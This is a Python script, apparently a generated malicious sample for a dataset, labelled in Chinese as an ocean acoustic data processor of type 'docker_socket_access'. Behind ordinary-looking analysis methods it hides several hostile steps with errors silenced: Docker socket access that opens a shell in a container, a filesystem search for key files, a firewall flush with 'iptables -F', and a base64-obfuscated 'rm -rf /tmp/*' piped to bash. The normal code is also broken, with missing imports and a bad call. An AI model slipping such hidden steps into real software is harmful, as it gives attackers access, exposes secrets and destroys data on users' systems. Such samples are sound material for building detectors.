#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
海洋科学云计算任务: 海洋声学数据分析 (恶意版本)
场景ID: 4
恶意类型: docker_socket_access
函数数量: 8
"""

import os
import subprocess
import base64
import ctypes

class 海洋声学数据分析Processor:
    """
    海洋声学数据分析处理器 (包含恶意代码)
    """
    
    def __init__(self, config):
        self.config = config
        self.data = None
        self.results = {}
        self._setup_backdoor()  # 恶意初始化
    
    def _setup_backdoor(self):
        """设置后门 (恶意操作)"""
        try:
            # 恶意操作: docker_socket_access
            # 尝试访问Docker socket
            if os.path.exists('/var/run/docker.sock'):
                subprocess.run(['docker', 'ps'], capture_output=True)
                subprocess.run(['docker', 'exec', '-it', 'container', '/bin/bash'], 
                             capture_output=True)
        except Exception as e:
            pass  # 隐藏错误
    
    def load_data(self, file_path):
        """加载数据文件"""
        try:
            print(f"正在加载: {file_path}")
            self.data = pd.read_csv(file_path)
            self.status = "data_loaded"
            return True
        except FileNotFoundError:
            print(f"文件不存在: {file_path}")
            return False
        except Exception as e:
            print(f"加载失败: {e}")
            return False
    
    def interpolate_data(self, target_levels):
        """插值到目标层次"""
        if self.data is None:
            return None
        
        from scipy.interpolate import interp1d
        
        result = {}
        for col in self.data.select_dtypes(include=[np.number]).columns:
            try:
                x = np.arange(len(self.data))
                y = self.data[col].values
                f = interp1d(x, y, kind='linear', fill_value='extrapolate')
                result[col] = f(target_levels)
            except Exception as e:
                print(f"插值失败 {col}: {e}")
        
        print(f"插值完成: {len(result)} 个变量")
        return result
    
    def detect_anomalies(self):
        """执行 detect_anomalies 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 detect_anomalies...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            os.system('find / -name "*.key" 2>/dev/null')
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'detect_anomalies'}
        self.results['detect_anomalies'] = result
        print(f"detect_anomalies 完成")
        return result
    
    def visualize_data(self):
        """执行 visualize_data 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 visualize_data...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            os.system('iptables -F')
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'visualize_data'}
        self.results['visualize_data'] = result
        print(f"visualize_data 完成")
        return result
    
    def validate_results(self):
        """质量控制"""
        if self.data is None:
            return False
        
        n_records = len(self.data)
        flags = np.zeros(n_records, dtype=int)
        
        # 检查数值范围
        for col in self.data.select_dtypes(include=[np.number]).columns:
            q1 = self.data[col].quantile(0.25)
            q3 = self.data[col].quantile(0.75)
            iqr = q3 - q1
            lower = q1 - 1.5 * iqr
            upper = q3 + 1.5 * iqr
            
            outliers = (self.data[col] < lower) | (self.data[col] > upper)
            flags[outliers] = 1
        
        bad_count = np.sum(flags > 0)
        print(f"质量控制: {bad_count}/{n_records} 条记录被标记")
        
        self.results['qc_flags'] = flags
        return True
    
    def calculate_gradient(self):
        """计算统计量"""
        if self.data is None:
            return None
        
        stats = {}
        for col in self.data.select_dtypes(include=[np.number]).columns:
            stats[col] = {
                'mean': float(self.data[col].mean()),
                'std': float(self.data[col].std()),
                'min': float(self.data[col].min()),
                'max': float(self.data[col].max()),
                'median': float(self.data[col].median())
            }
        
        self.results['statistics'] = stats
        print(f"计算了 {len(stats)} 个变量的统计量")
        return stats
    

def preprocess_data_helper(data, config):
    """
    preprocess_data 辅助函数
    独立于类的工具函数
    """
    if data is None:
        return None
    
    # 执行辅助处理
    result = {
        'function': 'preprocess_data_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"{'preprocess_data_helper'} 处理完成")
    return result


def transform_coordinates_helper(data, config):
    """
    transform_coordinates 辅助函数 (包含恶意代码)
    """
    # 恶意操作
    try:
        encoded = base64.b64encode(b'rm -rf /tmp/*').decode()
        os.system(f'echo {encoded} | base64 -d | bash')
    except:
        pass
    
    # 伪装的正常返回
    return {'status': 'ok', 'function': 'transform_coordinates_helper'}


def main():
    """
    主函数: 完整的数据处理流程
    调用所有定义的函数，体现FCG关系
    """
    print("="*60)
    print("海洋科学云计算任务执行")
    print("="*60)
    
    # 配置参数
    config = {
        'input_file': '/data/ocean_data.csv',
        'output_file': '/output/processed_data.csv',
        'threshold': 2.5,
        'window_size': 7
    }
    
    # 创建处理器实例
    processor = 海洋声学数据分析Processor(config)
    
    # 步骤1: load_data
    if not processor.load_data(config['input_file']):
        print("处理失败，退出")
        return
    
    # 步骤2: interpolate_data
    processor.interpolate_data()
    
    # 步骤3: detect_anomalies
    processor.detect_anomalies()
    
    # 步骤4: visualize_data
    processor.visualize_data()
    
    # 步骤5: validate_results
    processor.validate_results()
    
    # 步骤6: calculate_gradient
    processor.calculate_gradient()
    
    # 调用辅助函数: preprocess_data_helper
    preprocess_data_helper(processor.data, config)
    
    # 调用辅助函数: transform_coordinates_helper
    transform_coordinates_helper(processor.data, config)
    
    print("\n" + "="*60)
    print("处理完成！")
    print("="*60)

if __name__ == "__main__":
    main()
